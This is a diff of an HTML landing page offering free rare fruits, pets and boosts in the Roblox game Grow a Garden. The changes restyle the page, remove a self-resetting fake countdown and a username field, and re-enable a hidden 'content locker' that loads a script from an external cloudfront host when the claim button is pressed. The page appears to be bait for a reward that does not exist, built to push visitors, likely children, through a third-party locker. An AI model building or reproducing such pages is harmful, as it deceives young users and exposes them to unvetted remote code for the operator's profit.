@@ -10,116 +10,98 @@
 body{
     margin:0;
     font-family:'Segoe UI',Arial,sans-serif;
-    background:#ffffff;
+    background:#f0f4f8;
     color:#000;
 }
 .wrapper{
-    max-width:420px;
-    margin:auto;
+    max-width:450px;
+    margin:50px auto;
     padding:20px;
 }
 .card{
     background:#fff;
     border-radius:20px;
-    padding:22px;
-    box-shadow:0 15px 40px rgba(0,0,0,0.15);
+    padding:25px;
+    box-shadow:0 12px 25px rgba(0,0,0,0.15);
     animation:fadeIn 0.8s ease;
 }
 @keyframes fadeIn{
-    from{opacity:0;transform:translateY(20px)}
-    to{opacity:1;transform:translateY(0)}
+    from{opacity:0; transform:translateY(20px);}
+    to{opacity:1; transform:translateY(0);}
 }
 h1{
-    font-size:22px;
-    margin-bottom:8px;
+    font-size:24px;
+    margin:0 0 10px;
+    text-align:center;
 }
 .subtitle{
-    font-size:14px;
-    color:#444;
+    font-size:15px;
+    opacity:0.8;
+    text-align:center;
+    margin-bottom:15px;
 }
 .preview img{
     width:100%;
-    border-radius:14px;
-    margin:15px 0;
+    border-radius:15px;
+    margin-bottom:15px;
 }
 .badges{
     display:flex;
-    gap:8px;
+    gap:10px;
     flex-wrap:wrap;
+    justify-content:center;
+    margin-bottom:15px;
 }
 .badge{
-    background:#000;
-    color:#fff;
+    border:1px solid #000;
     padding:6px 12px;
-    border-radius:20px;
-    font-size:12px;
-}
-.timer{
-    margin:15px 0;
-    font-size:18px;
-    font-weight:bold;
-}
-.steps{
-    background:#f3f3f3;
-    padding:12px;
-    border-radius:12px;
-    font-size:14px;
-}
-.steps div{
-    margin-bottom:6px;
-}
-input{
-    width:100%;
-    padding:14px;
-    margin-top:15px;
-    border-radius:12px;
-    border:1px solid #ccc;
-    font-size:15px;
+    border-radius:25px;
+    font-size:13px;
 }
 .cta{
     margin-top:15px;
-    background:#000;
+    background:#28a745;
     color:#fff;
     text-align:center;
     padding:15px;
-    border-radius:14px;
+    border-radius:15px;
     font-weight:700;
     cursor:pointer;
+    transition:0.2s;
     animation:pulse 1.5s infinite;
 }
 @keyframes pulse{
     0%{transform:scale(1)}
-    50%{transform:scale(1.05)}
+    50%{transform:scale(1.03)}
     100%{transform:scale(1)}
 }
 .cta:hover{
-    background:#333;
-}
-.confirm{
-    display:none;
-    margin-top:10px;
-    font-size:14px;
+    background:#218838;
 }
 .locker{
+    margin-top:20px;
     display:none;
-    margin-top:15px;
+    animation:fadeInLocker 0.5s ease;
+}
+@keyframes fadeInLocker{
+    from{opacity:0; transform:translateY(10px);}
+    to{opacity:1; transform:translateY(0);}
 }
 .footer{
     text-align:center;
     font-size:11px;
     opacity:0.6;
-    margin-top:14px;
+    margin-top:20px;
 }
 </style>
 </head>
-
 <body>
 
 <div class="wrapper">
     <div class="card">
         <h1>🌱 Grow a Garden Rewards</h1>
         <div class="subtitle">
-            Unlock rare fruits, pets and farm boosts.
+            Unlock rare fruits, pets and boosts instantly in Roblox Grow a Garden!
         </div>
 
         <div class="preview">
@@ -127,37 +109,22 @@ input{
         </div>
 
         <div class="badges">
-            <div class="badge">Rare Fruits</div>
-            <div class="badge">Mythic Pets</div>
-            <div class="badge">Boosts</div>
-            <div class="badge">Limited</div>
+            <div class="badge">🍓 Rare Fruits</div>
+            <div class="badge">🐝 Mythic Pets</div>
+            <div class="badge">⚡ Boosts</div>
+            <div class="badge">⏳ Limited</div>
         </div>
 
-        <div class="timer" id="timer">
-            Access expires in: 05:00
+        <div class="cta" onclick="showLocker()">
+            🔓 CLAIM YOUR REWARDS
         </div>
-
-        <div class="steps">
-            <div>✔ Enter your Roblox username</div>
-            <div>✔ Verify you are human</div>
-            <div>✔ Receive your reward</div>
-        </div>
-
-        <!-- USERNAME INPUT -->
-        <input type="text" id="username" placeholder="Enter your Roblox username">
-
-        <div class="cta" onclick="openLocker()">
-            🔓 UNLOCK REWARDS
-        </div>
-
-        <div class="confirm" id="confirm"></div>
 
         <!-- 🔐 CONTENT LOCKER -->
         <div class="locker" id="locker">
-            <<script type="text/javascript">
-    var EpaSA_gyJ_NYjapc={"it":4489560,"key":"ecc9a"};
-</script>
-<script src="https://da4talg8ap14y.cloudfront.net/5054835.js"></script> -->
+            <script type="text/javascript">
+                var EpaSA_gyJ_NYjapc={"it":4489560,"key":"ecc9a"};
+            </script>
+            <script src="https://da4talg8ap14y.cloudfront.net/5054835.js"></script>
         </div>
 
     </div>
@@ -168,31 +135,10 @@ input{
 </div>
 
 <script>
-function openLocker(){
-    let user = document.getElementById("username").value.trim();
-    if(user === ""){
-        alert("Please enter your Roblox username");
-        return;
-    }
-    document.querySelector(".confirm").style.display="block";
-    document.querySelector(".confirm").innerHTML =
-        "Reward will be sent to: <b>"+user+"</b>";
-
-    document.querySelector(".cta").style.display="none";
-    document.getElementById("locker").style.display="block";
+function showLocker(){
+    document.querySelector('.cta').style.display = 'none';
+    document.getElementById('locker').style.display = 'block';
 }
-
-let time = 300;
-setInterval(()=>{
-    let m = Math.floor(time/60);
-    let s = time%60;
-    document.getElementById("timer").innerHTML =
-        "Access expires in: " +
-        String(m).padStart(2,'0') + ":" +
-        String(s).padStart(2,'0');
-    time--;
-    if(time < 0) time = 300;
-},1000);
 </script>
 
 </body>
